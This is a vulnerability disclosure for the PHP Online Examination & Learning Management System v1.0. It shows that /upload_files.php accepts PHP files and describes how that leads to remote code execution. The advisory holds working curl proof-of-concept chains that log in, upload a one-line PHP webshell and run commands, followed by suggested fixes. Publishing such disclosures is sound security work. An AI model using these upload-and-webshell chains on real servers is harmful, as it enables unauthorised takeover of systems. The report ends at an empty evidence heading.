# Online Examination & Learning Management System /upload_files.php Unrestricted File Upload → Remote Code Execution

## NAME OF AFFECTED PRODUCT(S)

Online Examination & Learning Management System

### Vendor Homepage

https://www.sourcecodester.com/download-code?nid=18739&title=Onlne+Examination+%26+Learning+Management+System+using+PHP+and+MySQL

## AFFECTED VERSION(S)

### Vulnerable File

`/upload_files.php`

### VERSION(S)

v1.0

## PROBLEM TYPE

### Vulnerability Type

Unrestricted File Upload → Remote Code Execution

### Root Cause

The `upload_files.php` handler processes class document uploads from instructors and administrators. The file extension is derived from `pathinfo($original_name, PATHINFO_EXTENSION)` using the attacker-controlled filename, and concatenated directly into the destination path. No extension whitelist, MIME type validation, or file content inspection exists.

The authorization gate at line 4 restricts access to `instructor` and `super_admin` roles. The `instructor` role is available through self-registration in the default configuration.

The web server (Apache 2.4.52 with `mod_php`) serves files directly from `uploads/class_docs/`. No `.htaccess` file exists to block PHP execution. `AllowOverride` is `None` globally.

```php
// upload_files.php line 19-24
$original_name = basename($_FILES["class_doc"]["name"]);
$ext = strtolower(pathinfo($original_name, PATHINFO_EXTENSION));   // user-controlled
$new_filename = "DOC_" . $subject_id . "_" . time() . "_" . uniqid() . "." . $ext;
$target_file = $target_dir . $new_filename;

if (move_uploaded_file($_FILES["class_doc"]["tmp_name"], $target_file)) {
    // No extension whitelist. No MIME check. No content inspection.
```

### Impact

An attacker with an instructor account can upload a PHP webshell and execute commands as `www-data`.

## DESCRIPTION

An unrestricted file upload vulnerability exists in the class document upload functionality. The `/upload_files.php` endpoint accepts file uploads via the `class_doc` form field and stores them with the original extension intact. Since `instructor` accounts can be created through self-registration, a remote attacker can obtain the necessary privileges and deploy a PHP webshell, achieving full remote code execution.

**An instructor account (self-registerable) is sufficient to exploit this vulnerability.**

## Vulnerability details and POC

### Vulnerability Endpoint

`POST /upload_files.php?subject_id=X`

### Attack Prerequisites

- An instructor or super_admin session
- Instructor role is self-registerable via `/auth.php`

### PoC 1: Login + Upload PHP Webshell

```bash
# Step 1: Login as instructor, store session cookie
curl -c /tmp/cookie -b /tmp/cookie \
  -X POST "http://TARGET/cictportal/auth_process.php" \
  -d "email=instructor@example.com&password=instructorpass&login_btn=1"

# Step 2: Create webshell payload
echo '<?php system($_GET["cmd"]); ?>' > /tmp/cmd.php

# Step 3: Upload via upload_files.php
curl -b /tmp/cookie \
  -X POST "http://TARGET/cictportal/upload_files.php?subject_id=11" \
  -F "class_doc=@/tmp/cmd.php;filename=cmd.php" \
  -F "submit_upload=1"
```

**Response**: HTTP 200 — page contains "FILE_ARCHIVED_SUCCESSFULLY".

### PoC 2: Execute Commands on Server

```bash
curl "http://TARGET/cictportal/uploads/class_docs/DOC_11_<timestamp>_<uniqid>.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### PoC 3: One-Liner Full Exploit Chain

```bash
curl -c /tmp/c -b /tmp/c -s \
  -X POST "http://TARGET/cictportal/auth_process.php" \
  -d "email=admin@cict.edu&password=admin123&login_btn=1" -o /dev/null && \
echo '<?php system($_GET["c"]); ?>' > /tmp/p.php && \
curl -s -b /tmp/c \
  -X POST "http://TARGET/cictportal/upload_files.php?subject_id=11" \
  -F "class_doc=@/tmp/p.php;filename=p.php" \
  -F "submit_upload=1" -o /dev/null -w "Upload: %{http_code}\n" && \
sleep 1 && \
F=$(curl -s -b /tmp/c "http://TARGET/cictportal/upload_files.php?subject_id=11" | grep -oP 'DOC_11_[a-f0-9_]+\.php' | tail -1) && \
echo "Shell: $F" && \
curl -s "http://TARGET/cictportal/uploads/class_docs/$F?c=id"
```

## Suggested repair

1. **Add extension whitelist**:

```php
$allowed = ['pdf', 'doc', 'docx', 'ppt', 'pptx', 'xls', 'xlsx', 'csv', 'jpg', 'png', 'zip'];
$ext = strtolower(pathinfo($original_name, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) {
    die("ERROR: File type not permitted.");
}
```

2. **Serve uploads through a proxy script** — move the `uploads/` directory outside the web root and use a PHP file to stream content. Never allow direct URL access.

3. **Add `.htaccess` in uploads directory** — `php_flag engine off`.

4. **Generate non-executable filenames** — use hash-based names with no extension, e.g., `sha256($original_name . time()) . '.bin'`.

5. **Validate MIME type server-side** — use `finfo_file()` to verify actual file content type.

## Reproduction Evidence
